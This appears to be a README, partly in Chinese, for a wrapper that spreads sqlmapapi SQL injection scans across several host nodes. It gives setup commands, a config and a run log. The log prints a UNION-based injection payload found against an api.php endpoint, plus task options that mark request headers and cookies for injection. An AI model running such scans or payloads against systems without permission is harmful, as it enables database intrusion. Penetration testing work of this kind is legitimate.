# SQLi



### 可部署多主机节点sqlmapapi来进行注入测试 (随机选择主机)

```
pip install requests
pip install eventlet

vim config.py
```
```
# API主机列表 格式 host:port:admin_id 如果不填写
hosts = [
    'localhost:8080',
    '127.0.0.1:8775:2872af061add7b2fea33e5b1f9434338',
]

# 默认管理id 建议修改sqlmap/lib/utils/api.py中admin_id为固定hash
default_admin_id = '182e2aab18e1e96a5e4d8be2411d56d3'

...
```
### 在主机节点上启动sqlmapapi(使用eventlet.wsgi)
```
cd sqlmap
python sqlmapapi.py -s -H 0.0.0.0 --adapter eventlet
```

### 测试
```
python run.py
```

```
[+] Host Number: 4
[+] Host List: [
  "daza.im",
  "hk.daza.im",
  "tokyo.daza.im",
  "tokyo2.daza.im"
]
#######################################################################################################################
2017-02-12 12:45:46,979 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:47,205 DEBUG "GET /admin/182e2aab18e1e96a5e4d8be2411d56d3/list HTTP/1.1" 200 148
2017-02-12 12:45:47,208 INFO [daza.im] Task Total Number: 2
2017-02-12 12:45:47,208 INFO [daza.im] Tasks: {
  "78973d80c9a2e81e": "terminated",
  "ebc3893dd771dfb6": "running"
}
2017-02-12 12:45:47,210 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:47,421 DEBUG "GET /scan/78973d80c9a2e81e/data HTTP/1.1" 200 2445
2017-02-12 12:45:47,422 CRITICAL Found Inject Task Id: 78973d80c9a2e81e
2017-02-12 12:45:47,423 CRITICAL Found Inject Task Id: [
  {
    "status": 1,
    "type": 0,
    "value": [
      {
        "dbms": null,
        "suffix": " AND '[RANDSTR]'='[RANDSTR]",
        "clause": [
          1,
          2,
          3,
          4,
          5
        ],
        "notes": [],
        "ptype": 2,
        "dbms_version": null,
        "prefix": "'",
        "place": "URI",
        "data": {
          "6": {
            "comment": "[GENERIC_SQL_COMMENT]",
            "matchRatio": null,
            "title": "Generic UNION query (NULL) - 1 to 10 columns",
            "trueCode": null,
            "templatePayload": null,
            "vector": [
              40,
              42,
              "[GENERIC_SQL_COMMENT]",
              "'",
              " AND '[RANDSTR]'='[RANDSTR]",
              "NULL",
              1,
              false,
              false
            ],
            "falseCode": null,
            "where": 1,
            "payload": "http://daza.im:82/api.php?username=a1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NU"
          }
        },
        "conf": {
          "code": null,
          "string": null,
          "notString": null,
          "titles": false,
          "regexp": null,
          "textOnly": false,
          "optimize": false
        },
        "parameter": "#1*",
        "os": null
      }
    ]
  }
]
2017-02-12 12:45:47,424 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:47,623 DEBUG "GET /task/78973d80c9a2e81e/delete HTTP/1.1" 200 23
2017-02-12 12:45:47,624 INFO Delete Task Id: 78973d80c9a2e81e
2017-02-12 12:45:47,625 INFO Starting new HTTP connection (1): hk.daza.im
2017-02-12 12:45:47,771 DEBUG "GET /admin/182e2aab18e1e96a5e4d8be2411d56d3/list HTTP/1.1" 200 62
2017-02-12 12:45:47,773 INFO [hk.daza.im] Task Total Number: 0
2017-02-12 12:45:47,773 INFO [hk.daza.im] Tasks: {}
2017-02-12 12:45:47,775 INFO Starting new HTTP connection (1): tokyo.daza.im
2017-02-12 12:45:47,882 DEBUG "GET /admin/182e2aab18e1e96a5e4d8be2411d56d3/list HTTP/1.1" 200 185
2017-02-12 12:45:47,883 INFO [tokyo.daza.im] Task Total Number: 3
2017-02-12 12:45:47,883 INFO [tokyo.daza.im] Tasks: {
  "144148f436827ea9": "running",
  "7b5162da2f5dd6f3": "running",
  "e5487a45f0ff13c1": "running"
}
2017-02-12 12:45:47,885 INFO Starting new HTTP connection (1): tokyo2.daza.im
2017-02-12 12:45:47,998 DEBUG "GET /admin/182e2aab18e1e96a5e4d8be2411d56d3/list HTTP/1.1" 200 105
2017-02-12 12:45:48,000 INFO [tokyo2.daza.im] Task Total Number: 1
2017-02-12 12:45:48,000 INFO [tokyo2.daza.im] Tasks: {
  "6defacdb3bc81485": "running"
}
#######################################################################################################################
2017-02-12 12:45:48,001 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:48,251 DEBUG "GET /admin/182e2aab18e1e96a5e4d8be2411d56d3/list HTTP/1.1" 200 105
2017-02-12 12:45:48,255 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:48,482 DEBUG "GET /task/new HTTP/1.1" 200 58
2017-02-12 12:45:48,485 INFO Starting new HTTP connection (1): daza.im
2017-02-12 12:45:48,746 DEBUG "POST /scan/4bc66ac3344ffd27/start HTTP/1.1" 200 47
2017-02-12 12:45:48,747 INFO Create Task Success, Task Id: [4bc66ac3344ffd27]
2017-02-12 12:45:48,747 INFO [4bc66ac3344ffd27] Task Options: {
  "url": "http://daza.im:82/api.php?username=a1*",
  "headers": [
    "Client-IP: 8.8.8.8*",
    "Accept-Encoding: gzip, deflate, sdch",
    "X-Forwarded-For: 1.1.1.1*",
    "User-Agent: 132*",
    "Cookie: a=1*",
    "X-Real-IP: 8.8.8.8*"
  ],
  "flushSession": true,
  "method": "GET"
}
2017-02-12 12:45:48,747 INFO Sleep 5s

```